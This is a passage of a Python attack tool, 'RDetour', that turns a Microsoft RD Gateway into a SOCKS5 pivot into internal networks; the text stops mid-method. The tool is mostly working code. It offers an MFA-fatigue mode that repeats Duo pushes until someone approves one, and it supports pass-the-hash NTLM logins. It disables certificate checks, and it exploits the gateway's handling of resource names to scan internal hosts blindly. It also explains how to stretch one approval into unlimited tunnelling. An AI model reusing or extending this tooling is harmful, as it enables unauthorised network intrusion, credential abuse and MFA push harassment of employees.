#!/usr/bin/env python3
"""
RDetour — RD Gateway (MS-TSGU HTTP transport) to SOCKS5.

One SOCKS CONNECT = one full tunnel (2 TLS legs + NTLM/EPA + channel), because
the HTTP transport binds DATA packets to the tunnel's single channel.
Protocol per [MS-TSGU] HTTP transport + FreeRDP libfreerdp/core/gateway/rdg.c.

  rdetour.py -g rdg.corp.com -u user -p pass                # SOCKS5 :1080
  proxychains nxc smb 10.0.0.10 -u user -p pass
  rdetour.py -g rdg.corp.com -u user -p pass --target 10.0.0.10:445 --probe smb
  rdetour.py -g rdg.corp.com -u user -p pass --mfa-fatigue  # push loop until approved

Auth: NTLM (password or --hashes LM:NT) wrapped in SPNEGO Negotiate with
tls-server-end-point channel binding (EPA). TLS certs are not verified
(gateway certs are commonly internal-CA or self-signed).
"""
import argparse
import base64
import hashlib
import json
import os
import random
import re
import socket
import ssl
import struct
import sys
import tempfile
import threading
import time
import uuid

MAX_PACKET = 0x20000  # sane DATA packet ceiling (write chunks at 0xFFFF)
CLOSE_GRACE_S = 0.4       # min seconds between channel close and next create —
                          # the gateway races closer-spaced creates with its
                          # server-side channel teardown (Server 2019 RDG)
ABRUPT_CLOSE_GRACE_S = 2.0  # after a server-initiated/abrupt channel close the
                            # teardown race window is seconds, not milliseconds
SNIFF_S = 10.0     # max wait for a 445 client's first packet before giving up
                   # on the connection — SMB clients always speak first
STILLBORN_S = 3.0  # granted-but-silent window: live targets answer an SMB
                   # negotiate in <100ms on this wire; silence past this is
                   # the refused-port stillborn (wire matrix A1-A4) and the
                   # tunnel is spent either way
REFUSED_CACHE_TTL_S = 7 * 86400  # refused-445 classifications persist a week:
                                 # a dead port does not come alive between
                                 # scan runs, and re-proving it costs a tunnel
                                 # (plus a Duo push for push-paying users)

HRESULTS = {
    0x80070005: "E_ACCESSDENIED",
    0x80075934: "E_PROXY_INTERNALERROR",
    0x80075935: "E_PROXY_NOCERT",
    0x80075936: "E_PROXY_UNSUPPORTED_VERSION",
    0x80075938: "E_PROXY_RAP_ACCESSDENIED",
    0x80075939: "E_PROXY_QUARANTINE_ACCESSDENIED",
    0x8007593D: "E_PROXY_CAPABILITYNOTSUPPORTED",
    0x8007593E: "E_PROXY_CONNECTIONABORTED",
    0x8007593F: "E_PROXY_RAP_NOTFOUND",
    0x80075940: "E_PROXY_TIMER_EXPIRED",
    0x8007274C: "ERROR_CONNECTION_REFUSED",
    0x80072726: "ERROR_CONNECTION_RESET",
    0x800759D8: "CHANNEL_IO_ABORT (win32 23000 — channel IO failed; "
                 "the target closed/reset the connection)",
    0x800759DB: "CAP_DENIED (win32 23003)",
    0x800759DD: "E_PROXY_TARGET_UNREACHABLE (win32 23005)",
}


def hresult_name(code):
    return HRESULTS.get(code, "win32=%d" % (code & 0xFFFF))


class RDGError(Exception):
    """Base; message is operator-facing."""


class RDGAuthError(RDGError):
    """HTTP leg auth failure (bad creds, no Negotiate challenge, 403)."""


class MfaNotApproved(RDGError):
    """Tunnel-auth stage denied or timed out — MFA pending/denied. Retryable."""


class RDGPolicyError(RDGError):
    """CAP/RAP policy denial."""


class RDGUnreachableError(RDGError):
    """No channel response — gateway-side connect() to the target stalled
    (observed against real RDG: unroutable targets hold the channel silent
    past any sane client window)."""


class RDGProtocolError(RDGError):
    """Malformed/foreign response."""

    def __init__(self, msg, code=None):
        super().__init__("%s (%s)" % (msg, hresult_name(code)) if code else msg)
        self.code = code


def u16(x):
    return struct.pack("<H", x)


def u32(x):
    return struct.pack("<I", x)


def utf16z(s):
    return s.encode("utf-16-le") + b"\x00\x00"


def pkt(ptype, payload=b""):
    return u16(ptype) + u16(0) + struct.pack("<I", 8 + len(payload)) + payload


def chunk(b):
    return ("%x\r\n" % len(b)).encode() + b + b"\r\n"


def smb2_negotiate():
    # SMB2 NEGOTIATE, dialects 0x0202-0x0300 — proves non-RDP TCP traverses.
    hdr = (b"\xfeSMB" + u16(64) + u16(0) + u32(0) + u16(0) + u16(0) +
           u32(0) + u32(0) + b"\x00" * 8 + u32(0xFEFF) + u32(0) +
           b"\x00" * 8 + b"\x00" * 16)
    neg = (u16(36) + u16(3) + u16(1) + u16(0) + u32(0) + b"\x11" * 16 +
           u32(0) + u16(0) + u16(0) + u16(0x0202) + u16(0x0210) + u16(0x0300))
    msg = hdr + neg
    assert len(hdr) == 64
    return b"\x00" + struct.pack(">I", len(msg))[1:] + msg


def channel_create_body(names, port, protocol):
    """HTTP_CHANNEL_PACKET body (MS-TSGU) for 1..50 PRIMARY resource names.

    numResources(1) numAltResources(1) port(2) protocol(2), then per name a
    UINT16 byte-length + UTF-16 string. Multiple PRIMARY names act as a
    pick-live list on Server 2019 RDG (wire-verified: [dead, live] grants
    instantly on the live name; numAltResources entries are IGNORED for
    connect fallback). This is what makes blind scanning survivable:
    [target, 127.0.0.1] can never be denied while the gateway's own port
    answers, so the tunnel (and its single MFA push) is never spent."""
    if isinstance(names, str):
        names = [names]
    body = struct.pack("<BB", len(names), 0) + u16(port) + u16(protocol)
    for h in names:
        name = utf16z(h)
        body += u16(len(name)) + name
    return body


def smb2_server_guid(buf):
    """ServerGUID (16 bytes) from an SMB2 NEGOTIATE response stream, else
    None (short buffer or not SMB2). Layout: NBSS(4) + SMB2 hdr(64) +
    structsize(2) secmode(2) dialect(2) ctxcount(2) -> GUID at [76:92].
    Unique per host — the live-vs-gateway-loopback oracle."""
    if len(buf) < 92 or buf[4:8] != b"\xfeSMB":
        return None
    return buf[76:92]


def smb1_probe(buf):
    """impacket's connection probe: an NBSS-framed SMB1 NEGOTIATE whose only
    dialect is 'NT LM 0.12'. SMB1-disabled servers (Server 2019 default)
    reset exactly this packet; impacket then reconnects multi-dialect and
    proceeds — invisible when direct. Forwarded through RDG, that server RST
    kills the whole tunnel (0x800759d8), so the warm server answers the
    probe locally instead."""
    if len(buf) < 36 or buf[0] != 0x00:            # NBSS session message
        return False
    if 4 + int.from_bytes(buf[1:4], "big") != len(buf):
        return False          # partial/concatenated framing — not the probe
    if buf[4:8] != b"\xffSMB" or buf[8] != 0x72:   # SMB1 NEGOTIATE
        return False
    return b"NT LM 0.12" in buf and b"SMB 2" not in buf


def rst(sock):
    """Close with an RST instead of a FIN (SO_LINGER 0) — what a closed port
    or an SMB1-disabled server does to the peer."""
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                        struct.pack("ii", 1, 0))
    except OSError:
        pass
    try:
        sock.close()
    except OSError:
        pass


def tls_server_end_point_hash(der):
    # RFC 5929: hash DER with the cert's signature alg; SHA-256 for MD5/SHA-1.
    try:
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes
        alg = x509.load_der_x509_certificate(der).signature_hash_algorithm
        if isinstance(alg, (hashes.MD5, hashes.SHA1)):
            return hashlib.sha256(der).digest()
        h = hashes.Hash(alg)
        h.update(der)
        return h.finalize()
    except Exception:
        return hashlib.sha256(der).digest()


class HTTPResponse:
    def __init__(self, status, headers, rest=b""):
        self.status = status
        self.headers = headers
        self.rest = rest

    def header(self, name, default=None):
        vals = self.headers.get(name.lower())
        return vals[-1] if vals else default

    def all_headers(self, name):
        return self.headers.get(name.lower(), [])


class RawTLS:
    def __init__(self, host, port, timeout=15):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        self.sock = socket.create_connection((host, port), timeout=timeout)
        try:
            self.tls = ctx.wrap_socket(self.sock, server_hostname=host)
        except Exception:
            self.sock.close()
            raise
        self.tls.settimeout(timeout)
        self.buf = b""
        try:
            der = self.tls.getpeercert(binary_form=True)
            self.app_data = b"tls-server-end-point:" + tls_server_end_point_hash(der)
        except Exception:
            self.app_data = None

    def send(self, b):
        self.tls.sendall(b)

    def recv(self, n=4096, timeout=None):
        if self.buf:
            out, self.buf = self.buf[:n], self.buf[n:]
            return out
        if timeout is not None:
            self.tls.settimeout(timeout)
        return self.tls.recv(n)

    def read_http_response(self):
        # Drain error bodies, never a 200 — that body IS the tunnel stream.
        while b"\r\n\r\n" not in self.buf:
            d = self.tls.recv(65536)
            if not d:
                raise RDGProtocolError("EOF during HTTP response head")
            self.buf += d
        head, self.buf = self.buf.split(b"\r\n\r\n", 1)
        lines = head.decode("latin1").split("\r\n")
        status = int(lines[0].split(" ")[1])
        headers = {}
        for ln in lines[1:]:
            if ":" in ln:
                k, v = ln.split(":", 1)
                headers.setdefault(k.strip().lower(), []).append(v.strip())
        cl = headers.get("content-length")
        if cl and "transfer-encoding" not in headers and status != 200:
            need = int(cl[-1])
            while len(self.buf) < need:
                d = self.tls.recv(65536)
                if not d:
                    break
                self.buf += d
            self.buf = self.buf[need:]
        return HTTPResponse(status, headers, self.buf)

    def close(self):
        try:
            self.tls.close()
        except Exception:
            pass
        try:
            self.sock.close()
        except Exception:
            pass


class ChunkedReader:
    def __init__(self, tls):
        self.tls = tls
        self.pending = b""
        self.eof = False

    def _read_line(self):
        while b"\r\n" not in self.pending:
            d = self.tls.recv(65536)
            if not d:
                raise RDGProtocolError("EOF in chunk header")
            self.pending += d
        line, self.pending = self.pending.split(b"\r\n", 1)
        return line

    def read(self, n):
        out = b""
        while len(out) < n and not self.eof:
            if not self.pending:
                size = int(self._read_line().split(b";")[0], 16)
                if size == 0:
                    self._read_line()
                    self.eof = True
                    break
                while len(self.pending) < size:
                    d = self.tls.recv(65536)
                    if not d:
                        raise RDGProtocolError("EOF in chunk body")
                    self.pending += d
                # extract chunk body, keep overflow, consume trailing CRLF
                chunk = self.pending[:size]
                self.pending = self.pending[size:]
                self._read_line()          # trailing CRLF after chunk body
                self.pending = chunk + self.pending
            take = min(n - len(out), len(self.pending))
            out += self.pending[:take]
            self.pending = self.pending[take:]
        return out


class RDGTunnel:
    """One tunnel = OUT leg (server->client) + IN leg (client->server) +
    one channel to host:port. write()/read() carry the channel payload.

    Live-gateway verified (Server 2019 RDG): a tunnel is authenticated once
    (tunnel-auth = the MFA push under per-auth MFA plugins) and carries
    exactly ONE channel for its lifetime — a second CHANNEL_CREATE on a live
    tunnel is ignored, and DATA packets carry no channel id, so there is no
    in-protocol reuse or multiplexing. Reuse tunnels by keeping authed,
    channel-less ones warm (see SocksServer pool)."""

    # MS-TSGU extended-auth selectors (handshake packet + RDG-Auth-Scheme).
    EXT_AUTH_NONE = 0x0
    EXT_AUTH_SC = 0x1        # smart card
    EXT_AUTH_PAA = 0x2       # pluggable auth — PAA cookie in TUNNEL_CREATE
    EXT_AUTH_SSPI_NTLM = 0x4  # NTLM tokens carried in EXT_AUTH_MSG packets

    def __init__(self, gateway, gport=443, domain=None, user=None, password=None,
                 nthash=None, path="/remoteDesktopGateway/", client_name=None,
                 connect_timeout=15, verbose=False, ext_auth="none",
                 paa_cookie=None):
        self.gateway = gateway
        self.gport = gport
        self.path = path
        self.verbose = verbose
        self.ext_auth = {"none": self.EXT_AUTH_NONE,
                         "sc": self.EXT_AUTH_SC,
                         "paa": self.EXT_AUTH_PAA,
                         "sspi_ntlm": self.EXT_AUTH_SSPI_NTLM}[ext_auth]
        self.paa_cookie = paa_cookie
        self.conn_id = str(uuid.uuid4()).upper()
        self.corr_id = str(uuid.uuid4()).upper()
        self.client_name = (client_name or socket.gethostname())[:15]
        self._cbt = {}
        self._cookies = []
        self.out_tls = self.in_tls = None
        self.out_reader = None
        self.closed = False          # tunnel dead (TLS/RST/explicit close)
        self.out_dead = False        # OUT TLS leg FIN/RST/errored (not timeout)
        self.last_srv_close_reason = None  # reason HRESULT of gateway 0x10
        self.last_close_ts = 0.0     # close->create grace bookkeeping
        self.last_close_abrupt = False
        self.suspect = False         # a channel close ended dirty (no clean
                                     # 0x11 handshake) — a later silent
                                     # tunnel death is the previous channel's
                                     # delayed kill, not this host's refusal
        self.drain_saw_data = False  # DATA the tunnel consumed invisibly
                                     # (close-drain / mid-body packet death)
                                     # — the reader never saw it, but the
                                     # target DID answer
        self.channel_open = False    # a channel is live on this tunnel
        self._srv_closed_channel = False  # gateway closed the channel itself
        self._ka_stop = threading.Event()
        try:
            import spnego
            from spnego.channel_bindings import GssChannelBindings
        except ImportError:
            raise RDGError("pyspnego required: pip install pyspnego")
        secret = ("%s:%s" % ("aad3b435b51404eeaad3b435b51404ee", nthash)
                  if nthash else password)
        self._spnego = spnego
        self._cb_cls = GssChannelBindings
        self._ident = (user, secret, domain, gateway)

    def log(self, *a):
        if self.verbose:
            print("[rdg]", *a, file=sys.stderr, flush=True)

    # ---- HTTP legs ----

    def _request(self, method, auth_hdr=None, chunked=False):
        lines = [
            "%s %s HTTP/1.1" % (method, self.path),
            "Host: %s" % self.gateway,
            "Pragma: no-cache",
            "Accept: */*",
            "Cache-Control: no-cache",
            "Connection: Keep-Alive",
            "User-Agent: MS-RDGateway/1.0",
        ]
        if self._cookies:
            lines.append("Cookie: " + "; ".join(self._cookies))
        lines.append("Transfer-Encoding: chunked" if chunked
                     else "Content-Length: 0")
        if self.ext_auth != self.EXT_AUTH_NONE:
            # Extended-auth modes carry credentials in the tunnel protocol
            # (PAA cookie / SSPI_NTLM packets), never in an Authorization
            # header; the selector rides in RDG-Auth-Scheme instead.
            schemes = {self.EXT_AUTH_PAA: "PAA",
                       self.EXT_AUTH_SSPI_NTLM: "SSPI_NTLM"}
            lines.append("RDG-Auth-Scheme: %s" % schemes[self.ext_auth])
        elif auth_hdr:
            lines.append("Authorization: Negotiate %s" % auth_hdr)
        lines.append("RDG-Connection-Id: {%s}" % self.conn_id)
        lines.append("RDG-Correlation-Id: {%s}" % self.corr_id)
        return ("\r\n".join(lines) + "\r\n\r\n").encode("latin1")

    def _grab_cookies(self, resp):
        for c in resp.all_headers("set-cookie"):
            pair = c.split(";", 1)[0].strip()
            if pair and pair not in self._cookies:
                self._cookies.append(pair)

    def _establish_leg(self, method):
        tls = RawTLS(self.gateway, self.gport)
        # Pin the channel binding from the gateway cert BEFORE building the
        # NTLM context — EPA-enforcing gateways RST unbound type3s.
        if tls.app_data and "app_data" not in self._cbt:
            self._cbt["app_data"] = tls.app_data
        if self.ext_auth != self.EXT_AUTH_NONE:
            # No HTTP auth at all — RDG-Auth-Scheme tells the gateway the
            # credentials arrive in the tunnel protocol (cookie or packets).
            tls.send(self._request(method))
            resp = tls.read_http_response()
            self._grab_cookies(resp)
            if resp.status != 200:
                tls.close()
                raise RDGAuthError("%s leg (ext-auth %s) HTTP %d (www-auth: %r)"
                                   % (method, self.ext_auth, resp.status,
                                      resp.all_headers("www-authenticate")))
            return tls, resp
        user, secret, domain, spn_host = self._ident
        cb = (self._cb_cls(application_data=self._cbt["app_data"])
              if self._cbt.get("app_data") else None)
        ctx = self._spnego.client(
            user, secret, service="http", hostname=spn_host, domain=domain,
            protocol="negotiate", channel_bindings=cb,
            options=self._spnego.NegotiateOptions.use_ntlm)
        tls.send(self._request(method,
                               auth_hdr=base64.b64encode(ctx.step()).decode()))
        resp = tls.read_http_response()
        self._grab_cookies(resp)
        if resp.status == 401:
            blob = None
            for tok in resp.all_headers("www-authenticate"):
                if tok.startswith(("Negotiate ", "NTLM ")):
                    blob = base64.b64decode(tok.split(" ", 1)[1].strip())
                    break
            if blob is None:
                tls.close()
                raise RDGAuthError("no NTLM challenge (www-auth: %r)"
                                   % resp.all_headers("www-authenticate"))
            tls.send(self._request(method,
                                   auth_hdr=base64.b64encode(ctx.step(blob)).decode()))
            resp = tls.read_http_response()
            self._grab_cookies(resp)
        if resp.status != 200:
            tls.close()
            raise RDGAuthError("%s leg HTTP %d (www-auth: %r)"
                               % (method, resp.status,
                                  resp.all_headers("www-authenticate")))
        return tls, resp

    # ---- tunnel establish ----

    def establish(self, auth_timeout=15):
        """Legs + handshake + tunnel create/auth. This is the stage a
        per-auth MFA plugin (Duo RDG) pushes at — one establish = one push.
        No channel yet: the tunnel can sit warm until open_channel()."""
        self.out_tls, out_resp = self._establish_leg("RDG_OUT_DATA")
        if (out_resp.header("transfer-encoding", "") or "").lower() == "chunked":
            self.out_tls.buf = out_resp.rest
            self.out_reader = ChunkedReader(self.out_tls)
        else:
            self.out_tls.buf = out_resp.rest
            self.out_reader = self.out_tls
        self._skip_seed()

        # IN leg (client -> server), then upgrade to chunked upload
        self.in_tls, _in_resp = self._establish_leg("RDG_IN_DATA")
        self.in_tls.send(self._request("RDG_IN_DATA", chunked=True))

        self._handshake()
        if self.ext_auth == self.EXT_AUTH_SSPI_NTLM:
            self._extauth_sspi_exchange()
        self._tunnel_create()
        self._tunnel_auth(auth_timeout)
        threading.Thread(target=self._keepalive_loop, daemon=True).start()
        return self

    def open_channel(self, hosts, port, protocol=3):
        """Bind the tunnel's single channel to host:port (RAP-checked, no
        MFA — the push was paid at establish()). `hosts` may be a single
        name or a list: a list rides the gateway's pick-live behavior
        (see channel_create_body) — [target, '127.0.0.1'] cannot be denied
        while the gateway itself answers the port."""
        # A create fired soon after a close races the gateway's server-side
        # channel teardown; after an ABRUPT close (server sent 0x10 first,
        # e.g. when the SOCKS client vanished) the race window is seconds
        # and a too-early create eats an instant tunnel RST (wire-observed
        # with nxc). Wait it out.
        grace = (ABRUPT_CLOSE_GRACE_S if getattr(self, "last_close_abrupt",
                                                 False) else CLOSE_GRACE_S)
        gap = time.monotonic() - getattr(self, "last_close_ts", 0)
        if 0 < gap < grace:
            time.sleep(grace - gap)
        self._channel_create(hosts, port, protocol)
        self.channel_open = True
        self._srv_closed_channel = False
        self.last_srv_close_reason = None
        return self

    def close_channel(self, timeout=8):
        """Cleanly close the live channel so the SAME tunnel can carry a new
        CHANNEL_CREATE (wire-verified on Server 2019 RDG: CLOSE_CHANNEL with
        reason 0 is acked 0x11 and the next CHANNEL_CREATE to a different
        target:port is granted). A DENIED CHANNEL_CREATE is not survivable —
        the gateway RSTs the TLS legs — so call this only after a channel
        that actually opened. Callers must ensure no reader thread is
        polling the OUT stream: the ack races any concurrent recv."""
        if not self.channel_open:
            return
        self.channel_open = False
        self._close_channel_xchg(timeout)

    def _close_channel_xchg(self, timeout=8):
        """Raw CLOSE_CHANNEL(0) -> 0x11 exchange. Assumes exclusive access to
        the OUT stream (no reader thread polling)."""
        # Let any in-flight target data land first: a response arriving after
        # the CLOSE makes the gateway abort the whole tunnel (0x800759d8,
        # wire-observed as the delayed post-close kill). The client is gone
        # by the time a close runs, so draining discards nothing it needs.
        for _ in range(2):
            dp = self.recv_packet(timeout=0.2)
            if dp is None:
                break
            if dp[0] == 0xA:
                # drained DATA: the target DID answer after all — a later
                # zero-reader-data death on this tunnel must not classify
                # the host refused
                self.drain_saw_data = True
        try:
            self.send_packet(pkt(0x10, u32(0)))
            p = self.recv_packet(timeout=timeout)
            self.log("close-channel ack: %s" % (p and hex(p[0])))
        except (ConnectionError, ssl.SSLError) as e:
            self.closed = True
            self.suspect = True
            raise RDGError("tunnel died closing channel: %r" % e)
        # No 0x11 within the window: tunnel is suspect — mark it dead so the
        # warm pool discards rather than reuses.
        if p is None or p[0] != 0x11:
            self.closed = True
            self.suspect = True
            raise RDGProtocolError("no close-channel ack — tunnel suspect")
        # The gateway's server-side teardown lags the 0x11 ack: a create sent
        # within ~100ms of a close is silently ignored (wire-observed with
        # nxc's back-to-back connections) — callers wait out CLOSE_GRACE_S.
        self.last_close_ts = time.monotonic()

    def connect_tunnel(self, host, port, protocol=3, auth_timeout=15):
        """One-shot establish + channel (check mode)."""
        self.establish(auth_timeout)
        self.open_channel(host, port, protocol)
        return True

    def _out_read_one(self, n):
        if isinstance(self.out_reader, ChunkedReader):
            return self.out_reader.read(n)
        return self.out_tls.recv(n)

    def _out_fill(self, n, timeout=10):
        while len(self.out_tls.buf) < n:
            if isinstance(self.out_reader, ChunkedReader):
                d = self.out_reader.read(n - len(self.out_tls.buf))
            else:
                d = self.out_tls.recv(65536, timeout=timeout)
            if not d:
                raise RDGProtocolError("EOF on OUT stream")
            self.out_tls.buf += d

    def _skip_seed(self):
        # MS-TSGU 3.3.5.1 step 4: a fixed 10-byte random seed precedes the
        # first packet (delivered with the 200). FreeRDP-compatible servers
        # observed send exactly this. The handshake response only arrives
        # AFTER the client sends its request, so never wait for it here.
        while len(self.out_tls.buf) < 10:
            try:
                d = self._out_read_one(10 - len(self.out_tls.buf))
            except socket.timeout:
                raise RDGProtocolError("seed payload incomplete (timeout)")
            if not d:
                raise RDGProtocolError("EOF reading seed payload")
            self.out_tls.buf += d
        seed = self.out_tls.buf[:10]
        self.out_tls.buf = self.out_tls.buf[10:]
        self.log("seed skipped: %s" % seed.hex())

    def _handshake(self):
        # 14 bytes: ver 1.0, clientVersion 0, extended-auth selector.
        self.send_packet(pkt(0x1, b"\x01\x00" + u16(0) + u16(self.ext_auth)))
        ptype, body = self._expect_packet(0x2)
        err = struct.unpack("<I", body[0:4])[0]
        if err:
            raise RDGProtocolError("handshake refused", err)
        self.server_ext_auth = struct.unpack("<H", body[8:10])[0]
        self.log("handshake ok (server ver %d.%d, advertises ext-auth 0x%x)"
                 % (body[4], body[5], self.server_ext_auth))

    def _extauth_sspi_exchange(self):
        """SSPI_NTLM: NTLM tokens inside EXT_AUTH_MSG (pkt 0x3) packets,
        in-band after the handshake — legs carry no Authorization header.
        Loop mirrors FreeRDP rdg_send/process_extauth_sspi."""
        user, secret, domain, spn_host = self._ident
        cb = (self._cb_cls(application_data=self._cbt["app_data"])
              if self._cbt.get("app_data") else None)
        ctx = self._spnego.client(
            user, secret, service="http", hostname=spn_host, domain=domain,
            protocol="ntlm", channel_bindings=cb,
            options=self._spnego.NegotiateOptions.use_ntlm)
        token = ctx.step()
        while True:
            self.send_packet(pkt(0x3, u32(0) + u16(len(token)) + token))
            ptype, body = self.recv_packet(timeout=30)
            if ptype is None or ptype != 0x3:
                raise RDGAuthError("ext-auth sspi: no/bad reply (got %r)"
                                   % (ptype,))
            err, blen = struct.unpack("<IH", body[0:6])
            if err:
                raise RDGAuthError("ext-auth sspi failed: %s" % hresult_name(err))
            if blen == 0:
                self.log("ext-auth sspi accepted")
                return
            token = ctx.step(body[6:6 + blen])
            if token is None:
                raise RDGAuthError("ext-auth sspi: context done but server "
                                   "expects another token")

    def _tunnel_create(self):
        caps = 0x1 | 0x4 | 0x8  # QUAR_SOH | CONSENT_SIGN | SERVICE_MSG
        if self.ext_auth == self.EXT_AUTH_PAA:
            if not self.paa_cookie:
                raise RDGError("ext-auth paa requires --paa-cookie")
            cookie = utf16z(self.paa_cookie)
            self.send_packet(pkt(0x4, u32(caps) + u16(1) + u16(0) +
                                 u16(len(cookie)) + cookie))
        else:
            self.send_packet(pkt(0x4, u32(caps) + u16(0) + u16(0)))
        ptype, body = self._expect_packet(0x5)
        err = struct.unpack("<I", body[2:6])[0]
        if err:
            raise RDGPolicyError("tunnel create denied: %s" % hresult_name(err))

    def _tunnel_auth(self, auth_timeout):
        name = utf16z(self.client_name)
        self.send_packet(pkt(0x6, u16(0) + u16(len(name)) + name))
        p = self.recv_packet(timeout=auth_timeout)
        if p is None or p[0] != 0x7:
            # No response at this stage = MFA push never approved (observed:
            # fail-closed MFA hangs the tunnel-auth response).
            raise MfaNotApproved("tunnel auth: no response in %ds (MFA pending?)"
                                 % auth_timeout)
        err = struct.unpack("<I", p[1][0:4])[0]
        if err == 0x80075939:  # quarantine denied — FreeRDP tolerates
            self.log("tunnel auth quarantine-tolerated")
            return
        if err:
            raise MfaNotApproved("tunnel auth denied: %s" % hresult_name(err))
        self.log("tunnel authorized")

    def _channel_create(self, names, port, protocol):
        shown = names if isinstance(names, list) else [names]
        t0 = time.monotonic()
        self.send_packet(pkt(0x8, channel_create_body(names, port,
                                                      protocol)))
        # 25s covers the ~21s Windows SYN-retransmit window, so a truly
        # unroutable target usually yields the gateway's own verdict here.
        p = self.recv_packet(timeout=25)
        if p is None:
            if self.out_dead:
                raise RDGUnreachableError(
                    "tunnel torn down before/while creating channel to %s "
                    "(OUT leg dead%s — a previous channel's target likely "
                    "closed/reset the connection)"
                    % (":".join("%s:%d" % (h, port) for h in shown),
                       ", abort 0x%08x" % self.last_srv_close_reason
                       if self.last_srv_close_reason else ""))
            raise RDGUnreachableError(
                "no channel response (waited %.0fs) — target %s likely "
                "unreachable from the gateway"
                % (time.monotonic() - t0,
                   ":".join("%s:%d" % (h, port) for h in shown)))
        if p[0] != 0x9:
            raise RDGProtocolError("bad channel response: got packet 0x%x"
                                   % p[0])
        err = struct.unpack("<I", p[1][0:4])[0]
        if err:
            raise RDGPolicyError("channel to %s denied: %s"
                                 % (",".join(shown), hresult_name(err)))
        self.log("channel up %s" % ",".join(shown))

    def _expect_packet(self, want):
        p = self.recv_packet()
        if p is None or p[0] != want:
            raise RDGProtocolError("expected packet 0x%x, got %r%s"
                                   % (want, p and p[0],
                                      " (OUT leg dead)" if self.out_dead
                                      else ""))
        return p

    # ---- data plane ----

    def send_packet(self, raw):
        self.in_tls.send(chunk(raw))

    def write(self, data):
        off = 0
        while off < len(data):
            part = data[off:off + 0xFFFF]
            self.send_packet(pkt(0xA, u16(len(part)) + part))
            off += len(part)

    def recv_packet(self, timeout=15):
        try:
            self._out_fill(8, timeout)
        except socket.timeout:
            return None
        except (ConnectionError, ssl.SSLError, RDGProtocolError):
            # OUT leg is DEAD (FIN/RST/TLS error), not merely quiet. Flag it
            # so callers can tell a torn-down tunnel from a silent target,
            # and so the warm pool discards the corpse instead of reusing it.
            self.out_dead = True
            self.closed = True
            return None
        hdr = self.out_tls.buf[:8]
        self.out_tls.buf = self.out_tls.buf[8:]
        ptype, _rsvd, plen = struct.unpack("<HHI", hdr)
        if plen > MAX_PACKET:
            raise RDGProtocolError("packet length 0x%x out of range" % plen)
        body = b""
        if plen > 8:
            try:
                self._out_fill(plen - 8, timeout)
            except socket.timeout:
                # the consumed header announced DATA — the body is still
                # coming; the reader can never see this packet whole now
                if ptype == 0xA:
                    self.drain_saw_data = True
                return None
            except (ConnectionError, ssl.SSLError, RDGProtocolError):
                self.out_dead = True
                self.closed = True
                if ptype == 0xA:
                    # mid-body DATA death: the answer existed, the reader
                    # just never saw it
                    self.drain_saw_data = True
                return None
            body = self.out_tls.buf[:plen - 8]
            self.out_tls.buf = self.out_tls.buf[plen - 8:]
        return (ptype, body)

    def read(self, timeout=15):
        while not self.closed:
            p = self.recv_packet(timeout)
            if p is None:
                return None
            ptype, body = p
            if ptype == 0xA:
                if len(body) < 2:
                    return b""
                return body[2:2 + struct.unpack("<H", body[:2])[0]]
            if ptype == 0xD:  # keepalive
                continue
            if ptype in (0x10, 0x11):  # close channel (either direction)
                self.channel_open = False
                self._srv_closed_channel = True
                if len(body) >= 4:
                    self.last_srv_close_reason = struct.unpack(
                        "<I", body[0:4])[0]
                    if self.last_srv_close_reason == 0x800759D8:
                        self.log("gateway aborted channel: 0x800759d8 "
                                 "(channel IO failure — target closed/reset)")
                return None
            self.log("packet 0x%x ignored" % ptype)
        return None

    def _keepalive_loop(self):
        while not self._ka_stop.wait(30):
            try:
                self.send_packet(pkt(0xD))
            except Exception:
                # Tunnel is dead — mark it so the pool discards on take.
                self.closed = True
                return

    def close(self):
        self._ka_stop.set()
        self.closed = True
        try:
            self.send_packet(pkt(0x10, u32(0xFFFFFFFE)))
        except Exception:
            pass
        for t in (self.out_tls, self.in_tls):
            if t:
                t.close()


# ---- SOCKS5 front end ----

def say(*a):
    print(*a, file=sys.stderr, flush=True)


def bridge_mode(args):
    """Single-tunnel bridge: one MFA-paid tunnel, one channel, bridged to a
    local listener. Pair with a multiplexing protocol so one approval serves
    unlimited use, e.g.  rdetour --bridge 2222 --target 10.0.0.5:22 ...
                          ssh -D 1080 -p 2222 user@127.0.0.1
    A second bridge session would mean a second tunnel (and push), so the
    bridge exits with the first client — keep one long-lived mux session."""
    host, port = args.target.rsplit(":", 1)
    lport = args.bridge
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((args.socks_host, lport))
    srv.listen(1)
    say("[bridge] listening on %s:%d — connect your mux client "
        "(ssh -D / chisel etc.)" % (args.socks_host, lport))
    client, _ = srv.accept()
    say("[bridge] client connected — paying the ONE tunnel MFA now "
        "(approve the push)")
    t = RDGTunnel(args.gateway, args.gport, args.domain, args.user,
                  args.password, nthash=args.nthash, path=args.rdg_path,
                  client_name=args.client_name,
                  connect_timeout=args.timeout, verbose=args.verbose,
                  ext_auth=args.ext_auth, paa_cookie=args.paa_cookie)
    t.establish(auth_timeout=args.mfa_auth_timeout)
    t.open_channel(host, int(port))
    say("[bridge] tunnel + channel up to %s:%d" % (host, int(port)))

    def up():
        try:
            while True:
                d = client.recv(65536)
                if not d:
                    break
                t.write(d)
        except OSError:
            pass
        finally:
            t.close()

    threading.Thread(target=up, daemon=True).start()
    try:
        while True:
            d = t.read(timeout=2)
            if d:
                client.sendall(d)
            if t.closed or not t.channel_open:
                break
    except (OSError, RDGError):
        pass
    finally:
        t.close()
        client.close()
        srv.close()
    say("[bridge] session ended (channel is single-use; rerun for another)")
    return 0


class SocksServer:
    def __init__(self, args, tunnel_factory):
        self.args = args
        self.factory = tunnel_factory
        self.stats = {"opened": 0, "failed": 0, "pushes": 0}
        self.establish_lock = threading.Lock()  # one tunnel setup at a time —
        # parallel setups fire parallel MFA pushes and cause approval races
        self.mfa_gate = threading.Event()
        self.mfa_lock = threading.Lock()
        self.mfa_dead = False
        self.mfa_hinted = False
        self._conn_seq = 0
        self._conn_lock = threading.Lock()

    def _next_conn(self):
        with self._conn_lock:
            self._conn_seq += 1
            return self._conn_seq

    def reply(self, client, rep):
        client.sendall(b"\x05" + bytes([rep]) + b"\x00\x01" +
                       b"\x7f\x00\x00\x01" + struct.pack(">H", 0))

    def _recv_exact(self, client, n):
        buf = b""
        while len(buf) < n:
